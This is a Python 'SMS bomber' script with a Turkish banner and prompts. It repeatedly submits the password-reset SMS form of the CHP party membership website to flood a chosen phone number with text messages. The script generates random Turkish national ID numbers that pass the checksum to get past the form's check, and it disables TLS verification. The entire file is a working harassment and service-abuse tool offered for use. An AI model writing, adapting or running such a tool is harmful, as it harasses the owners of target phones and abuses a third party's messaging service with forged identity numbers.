import requests
import json
import urllib3
import time
import random

try:
	print('''\


 ██████ ██    ██ ██████  ████████ ███████ ██████    
██       ██  ██  ██   ██    ██    ██      ██   ██   
██        ████   ██████     ██    █████   ██████    
██         ██    ██         ██    ██      ██   ██   
 ██████    ██    ██         ██    ███████ ██   ██   
                                                    
 ██████ ██   ██ ██████      ███████ ███    ███ ███████     
██      ██   ██ ██   ██     ██      ████  ████ ██          
██      ███████ ██████      ███████ ██ ████ ██ ███████     
██      ██   ██ ██               ██ ██  ██  ██      ██     
 ██████ ██   ██ ██          ███████ ██      ██ ███████     
                                                         
██████   ██████  ███    ███ ██████  ███████ ██████  
██   ██ ██    ██ ████  ████ ██   ██ ██      ██   ██ 
██████  ██    ██ ██ ████ ██ ██████  █████   ██████  
██   ██ ██    ██ ██  ██  ██ ██   ██ ██      ██   ██ 
██████   ██████  ██      ██ ██████  ███████ ██   ██ 

ÇIKMAK İÇİN CTRL + C YAPIN

UYARI: Sistem otomatik kendisi T.C oluşturuyor. 
İlerki zamanlarda aynı numaraya farklı tc girince sistemde sıkıntı olabiliyor.
Bu sebeple sistemin size otomatik verdiği TCyi o numara için not edin.
Tekrar o numaraya sms atmak istediğinizde o TC yi kullanın!

DC: CypTeR#0811
	''')

	urllib3.disable_warnings()
	url = "https://uyelik.chp.org.tr/Default.aspx"

	numara = input("TELEFON NUMARASINI BU FORMATTA (5xx)-xxx-xx-xx GİRİNİZ : ")
	delay = int(input("BEKLEME SÜRESİNİ GİRİNİZ GİRİNİZ (Tavsiye edilen 5): "))
	adet = int(input("kaç adet gönderiyim abi: "))
	tc = str(input("TC GİRİN VEYA r TUŞUNA BASIN: "))
	
	def tcolustur():
	    a1=random.randint(1,9)
	    a2=random.randint(0,9)
	    a3=random.randint(0,9)
	    a4=random.randint(0,9)
	    a5=random.randint(0,9)
	    a6=random.randint(0,9)
	    a7=random.randint(0,9)
	    a8=random.randint(0,9)
	    a9=random.randint(0,9)
	    a10=((((a1+a3+a5+a7+a9)*7)-(a2+a4+a6+a8))%10)
	    a11=((a1+a2+a3+a4+a5+a6+a7+a8+a9+a10)%10)
	    sonuc=str(a1)+str(a2)+str(a3)+str(a4)+str(a5)+str(a6)+str(a7)+str(a8)+str(a9)+str(a10)+str(a11)
	    return sonuc

	if tc == "r" or tc == "R":
		tc = tcolustur()
		print(numara+" numarası için T.C numaranız: "+tc+" NUMARAYA İLK DEFA ATIYORSANIZ NOT EDİN")
		print("")
	else:
		tc = tc
	headers = {
	"Host": "uyelik.chp.org.tr",
	"Connection": "keep-alive",
	"sec-ch-ua": 'Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98',
	"sec-ch-ua-mobile": '?0',
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36",
	"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
	"Cache-Control": "no-cache",
	"X-Requested-With": "XMLHttpRequest",
	"X-MicrosoftAjax": "Delta=true",
	"sec-ch-ua-platform": '"Windows"',
	"Accept": "*/*",
	"Origin": "https://uyelik.chp.org.tr",
	"Sec-Fetch-Site": "same-origin",
	"Sec-Fetch-Mode": "cors",
	"Sec-Fetch-Dest": "empty",
	"Referer": "https://uyelik.chp.org.tr/Default.aspx",
	"Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
	"Cookie": "ASP.NET_SessionId=fhuho2ztrep5l0lob2yydxpi",
	"Accept-Encoding": "gzip, deflate",
	"Content-Length": "3208",
	}
	 
	data = {
	"smkf": "upPanel|btnSorgula",
	"txtTckn": tcolustur(),
	"txtSifreTelefonNumarasi": numara,
	"hfFoto": "",
	"hdnFotoUrl": "resimyok.jpg",
	"hdnUyeID": "0",
	"hdnTckn": "0",
	"hdnKrediKartiID": "0",
	"hdnUyeIl": "0",
	"hdnUyeIlce": "0",
	"hdnTelefon": "0",
	"hdnYargitaySorguDurumu": "0",
	"__EVENTTARGET": "",
	"__EVENTARGUMENT": "",
	"__VIEWSTATE": "",
	"__VIEWSTATEGENERATOR": "CA0B0334",
	"__SCROLLPOSITIONX": "0",
	"__SCROLLPOSITIONY": "0",
	"__ASYNCPOST": "true",
	"btnSorgula": "Şifre gönder",
	}

	i=1
	while i<=adet:
		response = requests.post(url, headers=headers, data=data, verify=False,)
		kod = str(response.status_code)
		if kod == "200":
			print(str(i)+". GÖNDERİLDİ! =)")
		else:
			print("HATA OLDU :O KOD: "+kod)
		time.sleep(delay)
		i=i+1
		#print("JSON Response ", response.json())
		
except KeyboardInterrupt:
    print ("Goodbye =)")
    exit(0)